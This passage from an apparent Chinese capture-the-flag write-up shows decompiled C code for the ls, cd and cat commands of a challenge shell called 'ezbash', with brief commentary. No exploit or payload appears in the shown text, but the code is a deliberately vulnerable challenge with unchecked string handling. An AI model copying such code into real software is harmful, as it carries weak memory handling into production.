class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;putchar&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_43;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( checkfolder(v17) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cuurr_pos = v17;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v9 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(s1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v13 += v9 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_32:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !comment[nums][v13 - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] || comment[nums][v13 - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] == &lt;span class=&#34;number&#34;&gt;47&lt;/span&gt; &amp;amp;&amp;amp; !comment[nums][v13] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v16 &amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s:\n&amp;quot;&lt;/span&gt;, comment[nums]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        info_ls();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v16 &amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &amp;amp;&amp;amp; nums &amp;lt; v16 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;putchar&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( cuurr_pos-&amp;gt;futher )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      cuurr_pos = cuurr_pos-&amp;gt;futher;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_16:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v6 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(s1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v13 += v6 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_32;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;讲真 ls 代码很长，但是没啥用，特别是那个 alloca，就是浪费时间。&lt;/p&gt;
&lt;h4 id=&#34;cd&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cd&#34;&gt;#&lt;/a&gt; cd&lt;/h4&gt;
&lt;p&gt;cd 也是一个简单的跳到跳到某个目录下，实际就是更改下那两个变量，以及链表的遍历。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;acd&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **cmd)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// al&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; len_name; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-38h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *s1; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-30h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *pos; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-28h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; delim[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+36h] [rbp-1Ah] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v8; &lt;span class=&#34;comment&#34;&gt;// [rsp+38h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v8 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( cmd[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( cmd[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: too many arguments\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x1B&lt;/span&gt;uLL, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(delim, &lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( s1 = strtok(cmd[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;], delim); s1; s1 = strtok(&lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, delim) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(s1, &lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;) )                  &lt;span class=&#34;comment&#34;&gt;// 当前目录下或者父目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !&lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(s1, off_4077) )          &lt;span class=&#34;comment&#34;&gt;// ../&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( cuurr_pos-&amp;gt;futher )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              len_name = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(cuurr_pos-&amp;gt;name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              cur_position_addr[(&lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(cur_position_addr) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; - len_name)] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              cuurr_pos = cuurr_pos-&amp;gt;futher;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pos = cuurr_pos-&amp;gt;firstson;          &lt;span class=&#34;comment&#34;&gt;// ./&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ((&amp;amp;check_error + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: %s: No such file or directory\n&amp;quot;&lt;/span&gt;, s1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( pos &amp;amp;&amp;amp; &lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(pos-&amp;gt;name, s1) )&lt;span class=&#34;comment&#34;&gt;// 参数的第一的目标位置文件夹&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              pos = pos-&amp;gt;next_bro;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !checkfolder(pos) )            &lt;span class=&#34;comment&#34;&gt;// 检查是否为目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;something wrong happened\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x19&lt;/span&gt;uLL, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            cuurr_pos = pos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v3 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(cur_position_addr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 + &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(pos-&amp;gt;name) &amp;lt;= &lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;built_in&#34;&gt;strcat&lt;/span&gt;(cur_position_addr, pos-&amp;gt;name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              *&amp;amp;cur_position_addr[&lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(cur_position_addr)] = &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: expected argument\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x1A&lt;/span&gt;uLL, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;cat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cat&#34;&gt;#&lt;/a&gt; cat&lt;/h4&gt;
&lt;p&gt;cat 会输出文件中的数据，采用的是 puts，只会输出字符串。为实现 cat 重定向到文件&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;acat&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **cmd)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v1; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *v2; &lt;span class=&#34;comment&#34;&gt;// rsp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _BYTE v4[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-70h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **comment; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-68h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v6; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Fh] 